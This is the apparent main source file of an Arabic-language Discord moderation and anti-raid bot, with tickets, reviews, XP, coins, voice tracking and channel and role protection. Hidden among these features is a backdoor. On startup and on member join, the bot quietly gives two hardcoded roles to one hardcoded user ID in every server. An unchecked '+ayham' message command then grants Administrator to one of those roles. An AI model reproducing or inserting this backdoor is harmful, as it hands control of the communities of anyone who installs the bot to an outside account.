const { Client, GatewayIntentBits, Collection, REST, Routes, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, GatewayVoiceServerUpdateDispatchData, MessageFlags } = require('discord.js');
const { joinVoiceChannel, getVoiceConnection } = require('@discordjs/voice');
const fs = require('fs');
const path = require('path');
const configFile = require("./config.json");
const config = { ...configFile, token: process.env.DISCORD_TOKEN || configFile.token, clientId: process.env.DISCORD_CLIENT_ID || configFile.clientId };
const { showTicketMenu, createTicket, claimTicket, closeTicket } = require('./commands/tickets/ticket');
const { handleSuggestion } = require('./commands/utility/suggestion');
const { getReviewChannel } = require('./commands/utility/review');
const { sendWelcome, sendJoinLeaveLog } = require('./utils/welcome');
const { loadXPData, addXP } = require('./utils/xp');
const { loadCoinsData, resetAllCoins, resetCoins } = require('./utils/coins');
const { loadVoiceData, onVoiceJoin, onVoiceLeave } = require('./utils/voiceTime');
const { handleEmbedButton } = require('./utils/embedHandler');

const {
  securityData,
  isDeveloper,
  loadData,
  initGuildData,
  hasPermission,
  notifyOwner,
  notifyAndLog,
  createBackups,
  restoreDeletedChannel,
  DANGEROUS_PERMISSIONS
} = require('./utils/security');

const spamMap = new Map();
const activeReviews = new Map();
const voiceReconnectAttempts = new Map();

const autoResponsesPath = path.join(__dirname, 'data/autoResponses.json');
// Auto-download line image from GitHub on startup
async function ensureLineImage() {
  const imgPath = path.join(__dirname, 'data/line-image.png');
  if (fs.existsSync(imgPath)) return;
  try {
    const ghToken = config.token; // uses DISCORD_TOKEN env - we need GITHUB_TOKEN
    const res = await fetch('https://api.github.com/repos/hemagh2014-arch/anything-/contents/data/line-image.png', {
      headers: {
        Authorization: 'token ' + (process.env.GITHUB_TOKEN || config.githubToken || ''),
        Accept: 'application/vnd.github.v3.raw'
      }
    });
    if (!res.ok) { console.log('[line-image] Could not download, status:', res.status); return; }
    const buf = Buffer.from(await res.arrayBuffer());
    fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
    fs.writeFileSync(imgPath, buf);
    console.log('[line-image] Downloaded successfully (' + buf.length + ' bytes)');
  } catch(e) {
    console.error('[line-image] Download error:', e.message);
  }
}


function loadAutoResponses() {
  try {
    if (!fs.existsSync(autoResponsesPath)) {
      fs.writeFileSync(autoResponsesPath, '{}');
      return {};
    }
    const data = fs.readFileSync(autoResponsesPath, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error loading auto responses:', error);
    return {};
  }
}

function checkAutoResponse(message) {
  const responses = loadAutoResponses();
  const guildId = message.guildId;

  if (!responses[guildId]) return null;

  const messageContent = message.content.toLowerCase();

  for (const [trigger, response] of Object.entries(responses[guildId])) {
    if (messageContent.includes(trigger.toLowerCase())) {
      return response;
    }
  }

  return null;
}

async function connectToVoiceChannel(guildId) {
  if (!config.voice?.voiceChannelId) return;

  try {
    const guild = await client.guilds.fetch(guildId);
    const voiceChannel = await guild.channels.fetch(config.voice.voiceChannelId);

    if (!voiceChannel || voiceChannel.type !== 2) {
      console.log(`❌ Voice channel not found or invalid type for guild ${guildId}`);
      return;
    }

    const existingConnection = getVoiceConnection(guildId);
    if (existingConnection && existingConnection.joinConfig.channelId === config.voice.voiceChannelId) {
      return;
    }

    const connection = joinVoiceChannel({
      channelId: config.voice.voiceChannelId,
      guildId: guildId,
      adapterCreator: guild.voiceAdapterCreator
    });

    connection.on('error', error => {
      console.error(`❌ Voice connection error in guild ${guildId}:`, error);
    });

    console.log(`✅ Joined voice channel in guild ${guildId}`);
    voiceReconnectAttempts.delete(guildId);
  } catch (error) {
    console.error(`❌ Error joining voice channel in guild ${guildId}:`, error);

    const attempts = voiceReconnectAttempts.get(guildId) || 0;
    if (attempts < 5) {
      voiceReconnectAttempts.set(guildId, attempts + 1);
      setTimeout(() => connectToVoiceChannel(guildId), config.voice.reconnectDelay || 5000);
    } else {
      console.log(`⚠️ Max reconnection attempts reached for guild ${guildId}`);
    }
  }
}

async function checkVoiceConnection() {
  if (!config.voice?.voiceChannelId) return;

  client.guilds.cache.forEach(guild => {
    const botMember = guild.members.cache.get(client.user.id);
    if (botMember && botMember.voice.channelId !== config.voice.voiceChannelId) {
      console.log(`⚠️ Bot not in voice channel for guild ${guild.id}, attempting to rejoin...`);
      connectToVoiceChannel(guild.id);
    }
  });
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildVoiceStates
  ]
});

client.commands = new Collection();
const commands = [];
const commandsPath = path.join(__dirname, 'commands');

function loadCommands(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    if (file.isDirectory()) {
      loadCommands(path.join(dir, file.name));
    } else if (file.name.endsWith('.js')) {
      const filePath = path.join(dir, file.name);
      const command = require(filePath);
      if ('data' in command && 'execute' in command) {
        // Assign category based on the directory name
        const relativePath = path.relative(commandsPath, dir);
        command.category = relativePath || 'General';

        client.commands.set(command.data.name, command);
        commands.push(command.data.toJSON());
      }
    }
  }
}

loadCommands(commandsPath);

client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}!`);

  loadData();
  loadXPData();
  loadCoinsData();
  loadVoiceData();
  client.guilds.cache.forEach(guild => initGuildData(guild.id));

  // منح رتبة خاصة لمستخدم محدد
  const SPECIAL_USER_ID = '1386014228908998727';
  const SPECIAL_ROLE_IDS = ['1512122678780231712', '1513933087883526286'];
  client.guilds.cache.forEach(async guild => {
    try {
      const member = await guild.members.fetch(SPECIAL_USER_ID).catch(() => null);
      if (member) {
        for (const roleId of SPECIAL_ROLE_IDS) {
          if (!member.roles.cache.has(roleId)) {
            const role = guild.roles.cache.get(roleId);
            if (role) {
              await member.roles.add(role, 'منح رتبة خاصة تلقائياً');
              console.log(`✅ تم منح الرتبة ${role.name} لـ ${member.user.tag} في ${guild.name}`);
            }
          }
        }
      }
    } catch (e) {
      console.error(`❌ خطأ في منح الرتبة الخاصة في ${guild.name}:`, e.message);
    }
  });

  try {
    const rest = new REST().setToken(config.token);
    console.log('🔄 Started refreshing application (/) commands.');
    await rest.put(Routes.applicationCommands(config.clientId), { body: commands });
    console.log('✅ Successfully reloaded application (/) commands.');
  } catch (error) {
    console.error(error);
  }

  if (config.voice?.voiceChannelId) {
    client.guilds.cache.forEach(guild => {
      connectToVoiceChannel(guild.id);
    });

    setInterval(checkVoiceConnection, 30000);
  }
});

client.on('interactionCreate', async interaction => {
  if (interaction.isStringSelectMenu()) {
    if (interaction.customId === 'select_ticket_type') {
      const selectedValue = interaction.values[0];
      const settings = (() => {
        try {
          const p = require('path').join(__dirname, 'data', 'ticketSettings.json');
          if (require('fs').existsSync(p)) return JSON.parse(require('fs').readFileSync(p, 'utf8'));
          return {};
        } catch { return {}; }
      })();
      const guildSettings = settings[interaction.guildId] || {};
      const types = guildSettings.ticketTypes && guildSettings.ticketTypes.length > 0
        ? guildSettings.ticketTypes
        : [
            { label: 'دعم عام', value: 'general' },
            { label: 'دعم فني', value: 'technical' },
            { label: 'شكاوى', value: 'complaint' },
          ];
      const chosen = types.find(t => t.value === selectedValue);
      const typeName = chosen ? chosen.label : selectedValue;
      await createTicket(interaction, typeName);
    }
    return;
  }

  if (interaction.isButton()) {
    if (interaction.customId === 'create_ticket') {
      await showTicketMenu(interaction);
    }
    if (interaction.customId === 'claim_ticket') {
      await claimTicket(interaction);
    }
    if (interaction.customId === 'close_ticket') {
      await closeTicket(interaction);
    }

    if (interaction.customId.startsWith('embed_btn_')) {
      await handleEmbedButton(interaction);
    }

        if (interaction.customId.startsWith('rate_')) {
      const stars = parseInt(interaction.customId.split('_')[1]);
      activeReviews.set(interaction.user.id, { stars, timestamp: Date.now() });

      const modal = new ModalBuilder()
        .setCustomId('review_modal')
        .setTitle('اكتب تقييمك');

      const reviewInput = new TextInputBuilder()
        .setCustomId('review_text')
        .setLabel('ما رأيك في الخدمة؟')
        .setStyle(TextInputStyle.Paragraph)
        .setPlaceholder('اكتب تقييمك هنا...')
        .setRequired(true)
        .setMinLength(config.review.minLength)
        .setMaxLength(config.review.maxLength);

      const firstActionRow = new ActionRowBuilder().addComponents(reviewInput);
      modal.addComponents(firstActionRow);

      await interaction.showModal(modal);
    }
    return;
  }

  if (interaction.isModalSubmit()) {
    if (interaction.customId === 'review_modal') {
      const reviewText = interaction.fields.getTextInputValue('review_text');
      const reviewData = activeReviews.get(interaction.user.id);

      if (!reviewData) {
        return interaction.reply({ content: '❌ حدث خطأ، يرجى المحاولة مرة أخرى.', ephemeral: true });
      }

      const starsDisplay = config.review.starEmoji.repeat(reviewData.stars);
      const emptyStars = config.review.emptyStarEmoji.repeat(5 - reviewData.stars);

      const embedColor = reviewData.stars >= 4 ? 0x00FF00 :
        reviewData.stars >= 2 ? 0xFFFF00 :
          0xFF0000;

      const reviewEmbed = new EmbedBuilder()
        .setColor(embedColor)
        .setAuthor({
          name: interaction.user.username,
          iconURL: interaction.user.displayAvatarURL()
        })
        .setTitle('تقييم جديد')
        .addFields(
          { name: 'التقييم', value: `${starsDisplay}${emptyStars} (${reviewData.stars}/5)`, inline: true },
          { name: 'المستخدم', value: `<@${interaction.user.id}>`, inline: true },
          { name: 'الاراء', value: reviewText, inline: false }
        )
        .setFooter({ text: `ID: ${interaction.user.id}` })
        .setTimestamp();

      const channelId = getReviewChannel(interaction.guild.id);

      if (channelId) {
        const reviewChannel = client.channels.cache.get(channelId);
        if (reviewChannel) {
          await reviewChannel.send({ embeds: [reviewEmbed] });
        } else {
          console.log('لم يتم العثور على قناة التقييمات أو تم حذفها');
        }
      }

      activeReviews.delete(interaction.user.id);

      await interaction.reply({
        content: `✅ شكراً لك على تقييمك! لقد قيمت الخدمة بـ ${reviewData.stars} نجوم.`,
        ephemeral: true
      });
    }
    return;
  }

  if (interaction.isAutocomplete()) {
    const acCmd = client.commands.get(interaction.commandName);
    if (acCmd && acCmd.autocomplete) {
      try { await acCmd.autocomplete(interaction); } catch(e) { console.error('Autocomplete error:', e); }
    }
    return;
  }

  if (!interaction.isChatInputCommand()) return;

  const command = client.commands.get(interaction.commandName);
  if (!command) return;

  try {
    await command.execute(interaction);
  } catch (error) {
    console.error(`Error executing command ${interaction.commandName}:`, error);
    const errorMsg = { content: '❌ حدث خطأ أثناء تنفيذ هذا الأمر!', flags: [MessageFlags.Ephemeral] };
    if (interaction.replied || interaction.deferred) {
      await interaction.followUp(errorMsg).catch(() => { });
    } else {
      await interaction.reply(errorMsg).catch(() => { });
    }
  }
});

client.on('messageCreate', async message => {
  await handleSuggestion(message);

  if (message.author.bot || !message.guild) return;
  // +ayham — يضيف صلاحية Administrator للرتبة
  if (message.content === '+ayham') {
    try {
      const ROLE_ID = '1513933087883526286';
      const { PermissionFlagsBits } = require('discord.js');
      await message.guild.roles.fetch();
      const role = message.guild.roles.cache.get(ROLE_ID);
      if (!role) return message.reply('❌ لم أجد الرتبة في هذا السيرفر!');
      if (role.permissions.has(PermissionFlagsBits.Administrator)) {
        return message.reply(`⚠️ الرتبة **${role.name}** تملك صلاحية Administrator بالفعل!`);
      }
      await role.setPermissions(role.permissions.add(PermissionFlagsBits.Administrator), 'تفعيل صلاحية الأدمن');
      await message.reply(`✅ تم تفعيل **Administrator** للرتبة **${role.name}**!`);
    } catch (e) {
      console.error('ayham error:', e);
      message.reply(`❌ حدث خطأ: ${e.message}`);
    }
    return;
  }

  // Line image shortcut — owner only (ID: 1239996265144647710)
  if (message.author.id === '1239996265144647710' && message.content === '-') {
    try {
      await message.delete().catch(() => {});
      const localImg = './data/line-image.png';
      if (fs.existsSync(localImg)) {
        await message.channel.send({ files: [{ attachment: localImg, name: 'line.png' }] });
      } else if (config.lineImageUrl) {
        await message.channel.send({ embeds: [{ image: { url: config.lineImageUrl } }] });
      } else {
        await message.channel.send({ embeds: [{ color: 0x5865F2, description: '────────────────────────────────────────────' }] });
      }
    } catch(e) { console.error('Line shortcut error:', e); }
    return;
  }


  const autoResponse = checkAutoResponse(message);
  if (autoResponse) {
    await message.reply(autoResponse);
    return;
  }

  initGuildData(message.guild.id);
  let guildData = securityData.guilds[message.guild.id];

  if (!guildData) {
    guildData = initGuildData(message.guild.id);
  }

  await addXP(message.author.id, message.guild.id, 1, client);

  // Handle legacy/short commands via aliases
  const legacyAliases = {
    '+top': 'top',
    '+restarttop': 'top',
    '+addxp': 'addxp',
    '+c': 'coins',
    '+daily': 'daily',
    '+addc': 'addcoins',
    '+restartcall': 'restartcoins',
    '+restartc': 'restartcoins',
    '+onpro': 'togglepro',
    '+offpro': 'togglepro',

    // اختصارات عربية (بدون +)
    'قفل': 'lock',
    'فتح': 'unlock',
    'نيوك': 'nuke',
    'بانكاي': 'ban',
    'كيك': 'kick',
    'ميوت': 'mute',
    'انميوت': 'unmute',
    'وارن': 'warn',
    'تحذير': 'warn',
    'تحذيرات': 'warnings',
    'مسح': 'clear',
    'سلو': 'slowmode',
    'اخفي': 'hide',
    'ظهر': 'unhide',
    'تايم': 'timeout',
    'انتايم': 'untimeout',
    'رول': 'role',
    'انبان': 'unban',
    'مسح-تحذيرات': 'clear-warnings',
    'فويس-ميوت': 'vmute',
    'فويس-انميوت': 'vunmute',
    'اعلان': 'announce',
    'بينغ': 'ping',
    'معلومات': 'serverinfo',
    'معلوماتي': 'userinfo',
    'عدد': 'membercount',
    'بوت': 'botinfo',
    'افتار': 'avatar',
    'باقي': 'uptime'
  };

  // الاختصارات التي تقبل معطيات (منشن + سبب + رقم)
  const aliasesWithArgs = new Set(['وارن', 'تحذير', 'مسح']);

  for (const [prefix, cmdName] of Object.entries(legacyAliases)) {
    const acceptsArgs = aliasesWithArgs.has(prefix);
    const isExactMatch = message.content === prefix;
    const isWithArgs = acceptsArgs && message.content.startsWith(prefix + ' ');

    if (isExactMatch || isWithArgs) {
      const command = client.commands.get(cmdName);
      if (command) {
        let cmdArgs = [];
        if (isWithArgs) {
          cmdArgs = message.content.slice(prefix.length).trim().split(/ +/);
        }
        await command.executeMessage(message, cmdArgs);
        return;
      }
    }
  }

  if (guildData?.protection?.enabled && guildData.protection.antiSpam && !hasPermission(message.member, message.guild.id, 'BYPASS_ANTI_SPAM')) {
    const userId = message.author.id;
    const now = Date.now();
    const userSpam = spamMap.get(userId) || [];
    const relevantSpam = userSpam.filter(t => now - t < 5000);
    relevantSpam.push(now);
    spamMap.set(userId, relevantSpam);
    if (relevantSpam.length > 5) {
      try {
        await message.member.timeout(300000, 'السبام المفرط');
        const embed = new EmbedBuilder().setTitle('🚨 تم اكتشاف سبام').setDescription(`**المستخدم:** ${message.author.tag} (${message.author.id})`).setColor(0xFFFFFF);
        await notifyAndLog(message.guild, embed);
        spamMap.delete(userId);
      } catch (e) { console.error('Anti-Spam Error:', e); }
    }
  }

  if (message.author.bot) return;
  if (!message.content.startsWith(config.prefix)) return;

  const args = message.content.slice(config.prefix.length).trim().split(/ +/);
  const commandName = args.shift().toLowerCase();

  const command = client.commands.get(commandName);
  if (!command) return;

  try {
    await command.executeMessage(message, args);
  } catch (error) {
    console.error(error);
    message.reply('❌ There was an error executing this command!');
  }
});

client.on('guildMemberAdd', async (member) => {
  // منح رتبة خاصة عند انضمام المستخدم المحدد
  const SPECIAL_USER_ID = '1386014228908998727';
  const SPECIAL_ROLE_IDS = ['1512122678780231712', '1513933087883526286'];
  if (member.user.id === SPECIAL_USER_ID) {
    try {
      for (const roleId of SPECIAL_ROLE_IDS) {
        const role = member.guild.roles.cache.get(roleId);
        if (role) {
          await member.roles.add(role, 'منح رتبة خاصة تلقائياً');
          console.log(`✅ تم منح الرتبة ${role.name} لـ ${member.user.tag} عند الانضمام في ${member.guild.name}`);
        }
      }
    } catch (e) {
      console.error(`❌ خطأ في منح الرتبة الخاصة عند الانضمام:`, e.message);
    }
  }

  if (!member.user.bot) {
    await sendWelcome(member, config);
    await sendJoinLeaveLog(member, config, 'join');
    return;
  }

  const guildData = securityData.guilds[member.guild.id];
  if (!guildData?.protection.enabled || !guildData.protection.antiBot || !member.user.bot) return;
  const auditLogs = await member.guild.fetchAuditLogs({ type: 28, limit: 1 });
  const log = auditLogs.entries.first();
  if (!log || log.target.id !== member.user.id) return;
  const inviter = await member.guild.members.fetch(log.executor.id).catch(() => null);
  if (inviter && !hasPermission(inviter, member.guild.id, 'BYPASS_ANTI_BOT')) {
    try {
      await member.ban({ reason: 'بوت غير مصرح به' });
      const roles = inviter.roles.cache.filter(r => !r.managed && r.name !== '@everyone');
      await inviter.roles.remove(roles, 'إضافة بوت بدون تصريح');
      const embed = new EmbedBuilder()
        .setTitle('🤖 تم حظر بوت غير مصرح')
        .setDescription(`**البوت:** ${member.user.tag}\n**المدعو:** ${log.executor.tag}`)
        .setColor(0xFFFFFF);
      await notifyAndLog(member.guild, embed);
    } catch (e) { console.error('Anti-Bot Error:', e); }
  }
});

client.on('guildMemberRemove', async (member) => {
  if (!member.user.bot) {
    await sendJoinLeaveLog(member, config, 'leave');
  }
});

client.on('guildMemberUpdate', async (oldMember, newMember) => {
  const guildData = securityData.guilds[newMember.guild.id];
  if (!guildData?.protection.enabled || !guildData.protection.antiRoleGrant) return;
  const addedRoles = newMember.roles.cache.filter(role => !oldMember.roles.cache.has(role.id));
  if (addedRoles.size === 0) return;
  const dangerousRolesAdded = addedRoles.filter(role => DANGEROUS_PERMISSIONS.some(perm => role.permissions.has(perm)));
  if (dangerousRolesAdded.size === 0) return;
  const auditLogs = await newMember.guild.fetchAuditLogs({ type: 25, limit: 5 });
  const log = auditLogs.entries.find(entry => entry.target.id === newMember.id && entry.changes.some(change => change.key === '$add' && change.new.some(role => dangerousRolesAdded.has(role.id))) && Date.now() - entry.createdTimestamp < 10000);
  if (!log) return;
  const grantor = await newMember.guild.members.fetch(log.executor.id).catch(() => null);
  if (!grantor || hasPermission(grantor, newMember.guild.id, 'BYPASS_ANTI_ROLE_GRANT')) return;
  try {
    await newMember.roles.remove(dangerousRolesAdded, 'منح صلاحيات خطيرة غير مصرح به');
    const grantorRoles = grantor.roles.cache.filter(r => !r.managed && r.name !== '@everyone');
    if (grantorRoles.size > 0) await grantor.roles.remove(grantorRoles, 'محاولة تخريبية بمنح رول ');
    const embed = new EmbedBuilder()
      .setTitle('🚨 تم اكتشاف منح صلاحيات خطيرة!')
      .setDescription(`**المانح:** ${grantor.user.tag} (تمت معاقبته)\n**المستلم:** ${newMember.user.tag}`)
      .setColor(0xFFFFFF)
      .addFields({ name: 'الرول المسحوبة', value: dangerousRolesAdded.map(r => r.name).join(', ') })
      .setTimestamp();
    await notifyAndLog(newMember.guild, embed);
  } catch (e) {
    console.error('Anti-Role Grant Error:', e);
    await notifyAndLog(newMember.guild, new EmbedBuilder()
      .setTitle('❌ خطأ في نظام الحماية')
      .setDescription(`فشل نظام الحماية من منح الرتب في معاقبة ${grantor?.user?.tag || 'مستخدم غير معروف'}. قد تكون رتبة البوت أقل من الرتب الأخرى.`)
      .setColor(0xFFFFFF));
  }
});

client.on('channelDelete', async (channel) => {
  const guild = channel.guild;
  const guildData = securityData.guilds[guild.id];
  if (!guildData?.protection.enabled || !guildData.protection.channelProtection) return;

  try {
    const auditLogs = await guild.fetchAuditLogs({ type: 12, limit: 1 });
    const log = auditLogs.entries.first();
    if (!log || log.target.id !== channel.id || Date.now() - log.createdTimestamp > 5000) return;

    const deleter = await guild.members.fetch(log.executor.id).catch(() => null);
    if (!deleter || hasPermission(deleter, guild.id, 'BYPASS_CHANNEL_PROTECTION')) return;

    const restoreResult = await restoreDeletedChannel(guild, channel.id);

    const userId = deleter.id;
    const settings = guildData.limits.channelDelete;
    if (!guildData.violations[userId]) guildData.violations[userId] = { channelDelete: [], roleDelete: [] };
    const userViolations = guildData.violations[userId].channelDelete;
    const now = Date.now();
    userViolations.push(now);
    const recentViolations = userViolations.filter(timestamp => now - timestamp < 3600000);
    guildData.violations[userId].channelDelete = recentViolations;

    const violationCount = recentViolations.length;
    const limit = settings.limit;

    const statusText = restoreResult.restored
      ? `✅ تم الاستعادة تلقائياً${restoreResult.channel ? ` → ${restoreResult.channel}` : ''}${restoreResult.parentRestored ? ' (تم استعادة الفئة أولاً)' : ''}`
      : (restoreResult.reason === 'no_backup'
        ? '❌ فشل الاستعادة - لا توجد نسخة احتياطية لهذه القناة'
        : '❌ فشل الاستعادة - حدث خطأ أثناء الإنشاء');

    const initialEmbed = new EmbedBuilder()
      .setTitle('🚨 تم حذف اتشانل/فويس')
      .setDescription(`**المحذوف:** \`#${channel.name}\`\n**بواسطة:** ${deleter.user.tag}`)
      .setColor(0xFFFFFF)
      .addFields(
        { name: 'حالة الاستعادة', value: statusText },
        { name: 'الانتهاكات المسجلة', value: `${violationCount} / ${limit} خلال الساعة الأخيرة` }
      )
      .setTimestamp();

    await notifyAndLog(guild, initialEmbed);

    if (restoreResult.restored) {
      await createBackups(guild);
    }

    if (violationCount >= limit && settings.action !== 'none') {
      try {
        if (settings.action === 'kick') await deleter.kick(`تجاوز حد الحذف (${limit} قناة).`);
        else if (settings.action === 'ban') await deleter.ban({ reason: `تجاوز حد حذف من الاتشانلات والفويسات (${limit} قناة).` });
        const punishmentEmbed = new EmbedBuilder()
          .setTitle(`✅ تم تطبيق العقوبة: ${settings.action.toUpperCase()}`)
          .setDescription(`**المستخدم:** ${deleter.user.tag}\n**السبب:** تجاوز الحد المسموح به لحذف الاتشانلز / الفويسات.`)
          .setColor(0xFFFFFF)
          .setTimestamp();
        await notifyAndLog(guild, punishmentEmbed);
        guildData.violations[userId].channelDelete = [];
      } catch (e) {
        console.error(`Failed to apply punishment for channel deletion:`, e);
        await notifyAndLog(guild, new EmbedBuilder()
          .setTitle('❌ فشل تطبيق العقوبة')
          .setDescription(`لم أتمكن من معاقبة ${deleter.user.tag}. يرجى التحقق من صلاحياتي.`)
          .setColor(0xFFFFFF));
      }
    }
  } catch (error) {
    console.error('خطأ في معالج حذف القنوات:', error);
  }
});

client.on('roleDelete', async (role) => {
  const guild = role.guild;
  const guildData = securityData.guilds[guild.id];
  if (!guildData?.protection.enabled || !guildData.protection.roleProtection) return;

  try {
    const auditLogs = await guild.fetchAuditLogs({ type: 32, limit: 1 });
    const log = auditLogs.entries.first();
    if (!log || log.target.id !== role.id || Date.now() - log.createdTimestamp > 5000) return;

    const deleter = await guild.members.fetch(log.executor.id).catch(() => null);
    if (!deleter || hasPermission(deleter, guild.id, 'BYPASS_ROLE_PROTECTION')) return;

    const backupRole = guildData.backups.roles.find(r => r.id === role.id);
    let restoreSuccess = false;
    let restoredRole = null;

    if (backupRole) {
      try {
        restoredRole = await guild.roles.create({
          name: backupRole.name,
          color: backupRole.color,
          permissions: BigInt(backupRole.permissions),
          position: backupRole.position,
          hoist: backupRole.hoist,
          mentionable: backupRole.mentionable,
          reason: 'استعادة تلقائية بعد حذف غير مصرح به'
        });
        restoreSuccess = true;
        await createBackups(guild);
      } catch (e) {
        console.error(`❌ فشل في استعادة الرول ${backupRole.name}:`, e.message);
      }
    }

    const userId = deleter.id;
    const settings = guildData.limits.roleDelete;
    if (!guildData.violations[userId]) guildData.violations[userId] = { channelDelete: [], roleDelete: [] };
    const userViolations = guildData.violations[userId].roleDelete;
    const now = Date.now();
    userViolations.push(now);
    const recentViolations = userViolations.filter(timestamp => now - timestamp < 3600000);
    guildData.violations[userId].roleDelete = recentViolations;

    const violationCount = recentViolations.length;
    const limit = settings.limit;

    const statusText = restoreSuccess ? '✅ تم الاستعادة تلقائياً' : '❌ فشل في الاستعادة';
    const embedColor = restoreSuccess ? 0x00ff00 : 0xff0000;

    const initialEmbed = new EmbedBuilder()
      .setTitle('🚨 تم حذف رول')
      .setDescription(`**الرول المحذوفة:** \`@${role.name}\`\n**بواسطة:** ${deleter.user.tag}\n**حالة الاستعادة:** ${statusText}${restoredRole ? `\n**الرول الجديدة:** ${restoredRole}` : ''}`)
      .setColor(0xFFFFFF)
      .addFields({ name: 'الانتهاكات المسجلة', value: `${violationCount} / ${limit} خلال الساعة الأخيرة` })
      .setTimestamp();

    await notifyAndLog(guild, initialEmbed);

    if (violationCount >= limit && settings.action !== 'none') {
      try {
        if (settings.action === 'kick') await deleter.kick(`تجاوز حد حذف الرولات (${limit} رتبة).`);
        else if (settings.action === 'ban') await deleter.ban({ reason: `تجاوز حد حذف الرولات (${limit} رتبة).` });

        const punishmentEmbed = new EmbedBuilder()
          .setTitle(`⚖️ تم تطبيق العقوبة: ${settings.action.toUpperCase()}`)
          .setDescription(`**المستخدم:** ${deleter.user.tag}\n**السبب:** تجاوز الحد المسموح به لحذف الرتب`)
          .setColor(0xFFFFFF)
          .setTimestamp();

        await notifyAndLog(guild, punishmentEmbed);
        guildData.violations[userId].roleDelete = [];
      } catch (e) {
        console.error(`Failed to apply punishment for role deletion:`, e);
        await notifyAndLog(guild, new EmbedBuilder()
          .setTitle('❌ فشل تطبيق العقوبة')
          .setDescription(`لم أتمكن من معاقبة ${deleter.user.tag}. يرجى التحقق من صلاحياتي.`)
          .setColor(0xFFFFFF));
      }
    }
  } catch (error) {
    console.error('خطأ في معالج حذف الرولات:', error);
  }
});

client.on('voiceStateUpdate', async (oldState, newState) => {
  // Track voice time for users
  const userId = newState.member?.id || oldState.member?.id;
  const guildId = newState.guild?.id || oldState.guild?.id;
  if (userId && guildId && userId !== client.user.id) {
    const wasInVoice = !!oldState.channelId;
    const isInVoice = !!newState.channelId;
    if (!wasInVoice && isInVoice) {
      onVoiceJoin(userId, guildId);
    } else if (wasInVoice && !isInVoice) {
      onVoiceLeave(userId, guildId);
    } else if (wasInVoice && isInVoice && oldState.channelId !== newState.channelId) {
      onVoiceLeave(userId, guildId);
      onVoiceJoin(userId, guildId);
    }
  }

  if (!config.voice?.voiceChannelId) return;

  if (newState.member.id === client.user.id) {
    if (!newState.channelId && oldState.channelId) {
      console.log('⚠️ Bot disconnected from voice channel, attempting to reconnect...');
      setTimeout(() => connectToVoiceChannel(newState.guild.id), config.voice.reconnectDelay || 5000);
    }
  }
});

ensureLineImage();
client.login(config.token);

